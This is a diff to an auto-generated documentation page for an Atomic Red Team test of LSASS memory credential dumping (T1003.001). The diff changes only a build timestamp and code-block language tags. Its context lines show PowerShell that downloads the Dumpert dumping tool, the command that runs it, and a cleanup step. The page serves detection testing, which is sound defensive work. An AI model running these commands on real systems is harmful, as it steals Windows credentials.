@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1003.001"
 attack_technique_name: "OS Credential Dumping: LSASS Memory"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
-build_date: "2026-04-26 14:38:39"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "7ae7102c-a099-45c8-b985-4c7a2d05790d"
@@ -57,13 +57,13 @@ Dumpert executable must exist on disk at specified location (#{dumpert_exe})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{dumpert_exe}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 New-Item -ItemType Directory (Split-Path "#{dumpert_exe}") -Force | Out-Null
 Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -OutFile "#{dumpert_exe}"
@@ -76,13 +76,13 @@ Invoke-WebRequest "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c
 
 ### Command
 
-```commandprompt
+```cmd
 "#{dumpert_exe}"
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 del C:\windows\temp\dumpert.dmp >nul 2> nul
 ```
 
